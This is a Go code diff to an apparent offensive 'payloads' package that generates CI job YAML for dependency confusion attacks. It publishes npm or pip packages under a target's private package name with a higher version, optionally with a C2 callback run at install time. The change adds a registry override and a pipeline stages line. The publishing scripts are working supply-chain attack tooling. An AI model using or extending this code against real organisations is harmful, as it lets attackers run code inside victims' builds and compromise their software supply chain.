@@ -1,6 +1,9 @@
 package payloads
 
-import "fmt"
+import (
+	"fmt"
+	"strings"
+)
 
 // DepConfusionOptions configures a dependency confusion attack payload.
 type DepConfusionOptions struct {
@@ -8,6 +11,7 @@ type DepConfusionOptions struct {
 	PackageName string // target private package name (e.g. @acme/utils)
 	Version     string // version to publish (should be higher than internal)
 	Ecosystem   string // npm, pip, go
+	Registry    string // optional registry URL override
 	CallbackURL string // C2 callback for install-time execution
 }
 
@@ -30,16 +34,22 @@ func GenerateDepConfusionYAML(o DepConfusionOptions) string {
 		script = generateNpmConfusion(o)
 	}
 
-	return fmt.Sprintf(`%s:
+	return fmt.Sprintf(`stages: [%s]
+
+%s:
   stage: %s%s%s%s
   script:
     - |
 %s`,
-		name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
+		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		rulesManual(o.Common.Manual), indentScript(script, "      "))
 }
 
 func generateNpmConfusion(o DepConfusionOptions) string {
+	registryArg := ""
+	if registry := strings.TrimSpace(o.Registry); registry != "" {
+		registryArg = fmt.Sprintf(" --registry %q", registry)
+	}
 	callback := ""
 	if o.CallbackURL != "" {
 		callback = fmt.Sprintf(`
@@ -53,7 +63,7 @@ cat > /tmp/pkg/package.json << 'PKGJSON'
   }
 }
 PKGJSON
-cd /tmp/pkg && npm publish --access public || true`, o.PackageName, o.Version, o.CallbackURL)
+cd /tmp/pkg && npm publish --access public%s || true`, o.PackageName, o.Version, o.CallbackURL, registryArg)
 	} else {
 		callback = fmt.Sprintf(`
 mkdir -p /tmp/pkg
@@ -64,20 +74,24 @@ cat > /tmp/pkg/package.json << 'PKGJSON'
   "description": "dependency confusion proof of concept"
 }
 PKGJSON
-cd /tmp/pkg && npm publish --access public || true`, o.PackageName, o.Version)
+cd /tmp/pkg && npm publish --access public%s || true`, o.PackageName, o.Version, registryArg)
 	}
 	return callback
 }
 
 func generatePipConfusion(o DepConfusionOptions) string {
+	repositoryArg := ""
+	if registry := strings.TrimSpace(o.Registry); registry != "" {
+		repositoryArg = fmt.Sprintf(" --repository-url %q", registry)
+	}
 	return fmt.Sprintf(`
 mkdir -p /tmp/pkg/%s
 cat > /tmp/pkg/setup.py << 'SETUP'
 from setuptools import setup
 setup(name="%s", version="%s", packages=["%s"])
 SETUP
-cd /tmp/pkg && python3 setup.py sdist && twine upload dist/* || true`,
-		o.PackageName, o.PackageName, o.Version, o.PackageName)
+cd /tmp/pkg && python3 setup.py sdist && twine upload%s dist/* || true`,
+		o.PackageName, o.PackageName, o.Version, o.PackageName, repositoryArg)
 }
 
 func generateGoConfusion(o DepConfusionOptions) string {
